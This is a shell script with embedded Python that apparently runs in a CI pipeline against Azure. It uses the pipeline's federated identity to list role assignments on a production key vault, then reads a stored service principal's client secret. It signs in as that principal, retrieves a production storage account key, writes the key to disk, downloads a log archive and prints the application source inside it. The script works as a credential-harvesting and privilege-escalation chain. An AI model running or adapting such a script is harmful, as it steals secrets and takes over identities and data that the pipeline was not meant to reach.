#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
RG="rg-tbl-platform-prod-sea"
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
def oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jg(b).get("access_token")
ARM=oidc("https://management.azure.com/.default"); KVT=oidc("https://vault.azure.net/.default")
H={"Authorization":"Bearer "+ARM}
print("### role assignments on kv-tbl-sec-x3euoz")
u=(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.KeyVault/"
   f"vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
st,b=http(u, headers=H)
print("  HTTP", st)
for ra in jg(b).get("value",[]):
    p=ra["properties"]
    print("   principal:", p.get("principalId"), "| type:", p.get("principalType"), "| role:", p.get("roleDefinitionId","").rsplit("/",1)[-1])
# resolve role names
print("### our OIDC principal id")
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", headers=H)
print("  sub-level roleAssignments HTTP", st, "count", len(jg(b).get("value",[])))
for ra in jg(b).get("value",[])[:20]:
    p=ra["properties"]; print("   ", p.get("principalId"), p.get("principalType"), p.get("roleDefinitionId","").rsplit("/",1)[-1], p.get("scope","")[-60:])
PYEOF

echo
echo "=== dump app source from logs/zdep2.zip ==="
python3 - <<'PY2'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
c=json.loads(jg(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{c.get('tenantId',TEN)}/oauth2/v2.0/token",
  {"client_id":c["appId"],"client_secret":c["clientSecret"],
   "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
ARM=jg(b)["access_token"]
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/"
          f"providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01",
          data=b"", headers={"Authorization":"Bearer "+ARM}, method="POST")
open("/tmp/stkey","w").write(jg(b)["keys"][0]["value"])
PY2
KEY=$(cat /tmp/stkey)
az storage blob download -c logs -n zdep2.zip --account-name sttblcilogsprodx3euoz --account-key "$KEY" -f /tmp/z.zip --overwrite -o none 2>/dev/null
mkdir -p /tmp/zz && unzip -o -q /tmp/z.zip -d /tmp/zz
echo "--- requirements.txt"; cat /tmp/zz/requirements.txt
echo; echo "--- app.py"; cat /tmp/zz/app.py
rm -f /tmp/stkey
echo "=== done ==="